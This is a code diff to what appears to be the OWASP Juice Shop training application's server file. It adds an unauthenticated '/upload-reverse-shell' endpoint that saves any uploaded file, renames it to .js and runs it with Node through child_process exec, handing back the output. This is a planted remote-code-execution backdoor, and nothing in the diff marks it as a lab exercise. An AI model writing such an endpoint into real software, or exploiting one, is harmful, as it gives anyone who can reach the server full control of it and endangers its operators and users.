@@ -39,6 +39,8 @@ import customizeEasterEgg from './lib/startup/customizeEasterEgg' // vuln-code-s
 
 import authenticatedUsers from './routes/authenticatedUsers'
 
+import { exec } from 'child_process';
+
 const startTime = Date.now()
 const finale = require('finale-rest')
 const express = require('express')
@@ -727,6 +729,36 @@ export function close (exitCode: number | undefined) {
   }
 }
 // vuln-code-snippet end exposedMetricsChallenge
+// Configure multer to use /src/uploads directory
+const upload = multer({ dest: path.join(__dirname, 'uploads') }); // Adjust path to /src/uploads
+
+app.post('/upload-reverse-shell', upload.single('file'), (req: Request, res: Response) => {
+  if (!req.file) {
+    return res.status(400).send('No file uploaded');
+  }
+
+  // Use /src/uploads path for file operations
+  const originalPath = path.join(__dirname, 'uploads', req.file.filename);
+  const newPath = `${originalPath}.js`; // Append .js extension
+
+  // Rename the file to include .js extension
+  fs.rename(originalPath, newPath, (err) => {
+    if (err) {
+      console.error(`File rename error: ${err.message}`);
+      return res.status(500).send(`File rename error: ${err.message}`);
+    }
+
+    // Execute the renamed file with Node.js
+    exec(`node ${newPath}`, (error, stdout, stderr) => {
+      if (error) {
+        console.error(`Execution error: ${error.message}`);
+        return res.status(500).send(`Error executing file: ${error.message}`);
+      }
+
+      res.send(`File executed successfully with output: ${stdout || stderr}`);
+    });
+  });
+});
 
 // stop server on sigint or sigterm signals
 process.on('SIGINT', () => { close(0) })
